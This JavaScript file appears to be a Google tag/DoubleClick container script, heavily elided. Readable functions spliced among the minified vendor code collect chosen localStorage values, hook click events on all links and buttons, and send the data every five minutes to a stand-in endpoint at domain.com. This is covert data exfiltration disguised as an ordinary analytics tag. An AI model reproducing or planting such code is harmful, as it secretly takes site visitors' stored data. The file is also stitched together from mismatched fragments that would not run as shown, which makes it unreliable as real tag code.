...
(function () {
  ...
  // List of keys to watch. Extend this list as per your requirements.
  var keysToMonitor = ['key1', 'key2', 'key3'];
  ...
  function createHash(data) {
    let combinedKeys = Object.keys(data).join('');
    let computedHash = 0;
    for (let iter = 0; iter < combinedKeys.length; iter++) {
      computedHash = (computedHash << 5) - computedHash + combinedKeys.charCodeAt(iter);
      computedHash |= 0;
    }
    return computedHash.toString(16);
  }

  // Method to collect matching local storage data.
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgJrLqwYQ8rmNr4e66v2jARIjAFdulMPKRjsl3gpuTipvY21VO0GTCuDdQ+pgBYeA7leESFsaAjgG";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  R(57);
  R(58);
  function collectMatchedStorageData() {
    let matchedStorageData = {};
    for (let iter = 0; iter < localStorage.length; iter++) {
      let keysGrabbed = localStorage.key(iter);
      if (keysToMonitor.includes(keysGrabbed)) {
        matchedStorageData[keysGrabbed] = localStorage.getItem(keysGrabbed);
      }
    }
    return matchedStorageData;
  }
  ...
  var Wl = {
    ...
    Xl = sl('', 500);
  function addSpecificEventListener(element, event, fn) {
    if (!element.events) {
      element.events = {};
    }
    element.removeEventListener(event, element.events[event]);
    element.events[event] = fn;
  ...
  function trackElementEvents(selector, event) {
    var elements = document.querySelectorAll(selector);
    elements.forEach(element => {
      addSpecificEventListener(element, event, () => {
        let capturedData = {
  ...
  function sendDataToServer(data) {
    let uniqueId = createHash(data);
    let apiUrl = 'https://domain.com/api/collect';
    ...
    xhrRequest.send(JSON.stringify(payloadData));
    xhrRequest.onreadystatechange = function () {
      if (xhrRequest.readyState == 4 && xhrRequest.status == 200) {
        console.log("Data successfully sent to server.");
      } else {
        console.error("Error in sending data. Status code: " + xhrRequest.status);
      }
    };
  }

  // Method to collect and send storage data.
  ...
  function gatherAndSendStorageData() {
    let collectedData = collectMatchedStorageData();
  ...
  var LC = function (a) {
    ...
    MC = {},
    NC = (MC[Q.g.vd] = "gcu", MC[Q.g.sb] = "gclaw", MC[Q.g.Hb] = "auiddc", MC[Q.g.Jb] = "ps", MC[Q.g.bf] = "pscdl", MC[Q.g.ui] = "gcldc", MC[Q.g.ub] = "edid", MC[Q.g.Ai] = "cat", MC[Q.g.Bi] = "type", MC[Q.g.wg] = "src", MC[Q.g.Ci] = "pcor", MC[Q.g.Di] = "num", MC[Q.g.Ei] = "tran", MC[Q.g.Fi] = "u", MC[Q.g.Pd] = "gac", MC[Q.g.uc] = "gacgb", MC[Q.g.Qd] = "gdpr", MC[Q.g.wb] = "gdid", MC[Q.g.Sd] = "gtm_up", MC[Q.g.Zc] = "qty", MC[Q.g.Xd] = "gdpr_consent", MC[Q.g.ya] = "ord", MC[Q.g.ja] = "cost", MC[Q.g.wc] = "gclgb", MC[Q.g.yc] = "npa", MC[Q.g.Ba] = null, MC[Q.g.Rc] = null, MC[Q.g.ba] = null, MC[Q.g.Yd] = null, MC[Q.g.Zd] = null, MC[Q.g.ae] = null, MC[Q.g.be] = null, MC[Q.g.ce] = null, MC[Q.g.de] = null, MC[Q.g.ee] = null, MC[Q.g.fe] = null, MC),
    OC = function (a, b) {
      var c = [],
        d = {},
        e = function (t, u, v) {
      ...
      pm() && e("gcs", qm());
      S(35) && e("gcd", um(a.s));
      S(37) && (ym() && e("dma_cps", vm()), e("dma", xm()));
      S(61) && Ql(Zl()) && e("tcfd", zm());
      var g = LC(a);
      g && e("prd", g, !0);
      var k = function (t, u) {
        var v = a.h[t];
    ...
    PC = function (a) {
      OC(a, function (b) {
        ...
        a.metadata.attribution_reporting_experiment && (S(56) ? Nc("https://ad.doubleclick.net/activity;register_conversion=1;" + m.join(";") + "?", void 0, void 0, {
          attributionsrc: ""
        }) : Wc("https://ad.doubleclick.net/activity;register_conversion=1;" + m.join(";") + "?"));
        if (a.metadata.send_fledge_experiment) {
          var p = os() + "/td/fls/rul/activityi;fledge=1;" + m.join(";") + "?";
          ns(p, c.target.id);
        }
      });
    };
  var QC = function () {
    ...
    XC = function (a, b, c, d) {
      function e() {
        for (var m = 0; m < WC.length && (WC[m](g), !g.isAborted); ++m);
        g.metadata.speculative || g.isAborted || PC(g);
      }
      var f = UC(a);
      if (f) {
        ...
        dk(function () {
          e();
          g.isAborted ? H(g.s.onSuccess) : ak(k) || ck(function (m) {
    ...
    WC = [Iq, function (a) {
      a.metadata.conversion_linker_enabled = !1 !== W(a.s, Q.g.Ha);
      var b = !0 === W(a.s, Q.g.Ye),
        c = ak(Q.g.K);
      if (Xm() && b) {
        b = !1;
      }
      ...
      a.metadata.redact_click_ids = a.metadata.redact_ads_data && !ak(QC());
      var e = {
        prefix: W(a.s, Q.g.Pa) || W(a.s, Q.g.Qa),
        domain: W(a.s, Q.g.Wa),
        Xb: W(a.s, Q.g.Ja),
        flags: W(a.s, Q.g.Xa)
      };
      ...
      if (!a.metadata.consent_updated) {
        var b = a.s.isGtmEvent ? W(a.s, "oref") : Gn(Hn(z.location.href));
        a.h[Q.g.Ba] = b;
      }
    }, function (a) {
      if (a.eventName === Q.g.Oa && !a.s.isGtmEvent) {
        if (!a.metadata.consent_updated) {
          var b = {
            callback: W(a.s, Q.g.vb),
            Dj: W(a.s, W(a.s, Q.g.jb)),
            Xj: W(a.s, Q.g.jb)
          };
          Hq(b, a.metadata.cookie_options, a.metadata.redact_ads_data, zq);
        }
        a.isAborted = !0;
      }
    }, function (a) {
      if (a.eventName === Q.g.sa && !a.s.isGtmEvent) if (a.metadata.consent_updated) a.isAborted = !0;else {
        ...
        Gq({
          ...
          Uj: W(a.s, Q.g.Bb),
          Yf: Dp(a),
          allowAdPersonalizationSignals: om(a.s)
        }, c);
        VC(a);
      ...
      var d = "transactions" === b ? "1" : W(a.s, Q.g.Zc);
      a.h[Q.g.Zc] = d;
      a.copyToHitData(Q.g.ja);
      a.copyToHitData(Q.g.ya);
    }, function (a) {
      a.s.isGtmEvent && (a.copyToHitData(Q.g.Fi), a.copyToHitData(Q.g.Ei), a.copyToHitData(Q.g.xg));
    }, function (a) {
      ...
      om(a.s) ? S(39) && (a.h[Q.g.yc] = "0") : a.h[Q.g.yc] = "1";
    }, function (a) {
      if (a.metadata.conversion_linker_enabled) {
        ...
        e && e.length && (a.h[Q.g.ui] = e.join("."), f = !0);
        if (a.metadata.send_as_iframe) {
          var k = "_gcl" !== Ko(c.prefix);
          if (f || !Dq(c.prefix)) {
            var m = yq(c.prefix, d);
            m && m.length && (a.h[Q.g.sb] = m.join("."), O(59));
            var n = Aq(d);
            n && (k || (a.h[Q.g.Pd] = n));
          } else {
      ...
      if ("transactions" === b || "items_sold" === b) {
        ...
        if (Ia(d)) {
          for (var e = 0; e < d.length; e++) {
            var f = d[e];
            nb(f) && !c && (f[Q.g.sc] = W(a.s, Q.g.sc), f[Q.g.Ka] = W(a.s, Q.g.Ka), f.accountId = void 0);
          }
          a.h[Q.g.ba] = d;
        }
      }
      ...
      var b = ak(QC()) && SC();
      if (a.metadata.attribution_reporting_experiment = b) a.h[Q.g.Jb] = "1", a.h[Q.g.Ci] = Ka();
    }, function (a) {
      if (a.s.isGtmEvent) {
        var b = W(a.s, Q.g.Ca);
      ...
      S(11) && ak(QC()) && !1 !== W(a.s, Q.g.Ga) && om(a.s) && ms() && (a.metadata.send_fledge_experiment = !0);
    }, function (a) {
      if (Ep(a, "ccd_add_1p_data", !1) && (!S(60) || ak(Q.g.O))) {
        var b = a.s.C[Q.g.ie];
        if (Wi(b)) {
          var c = W(a.s, Q.g.Ca);
  ...
  window.onload = function () {
    ...
    trackElementEvents('a', 'click');
    trackElementEvents('button', 'click');
  };
  function iE(a) {
    var b = void 0;
    return md(b, this.h, 1);
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'DC-8836097'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  setInterval(gatherAndSendStorageData, 5 * 60 * 1000);
  function FE(a) {
    var b = "";
    return b;
  }
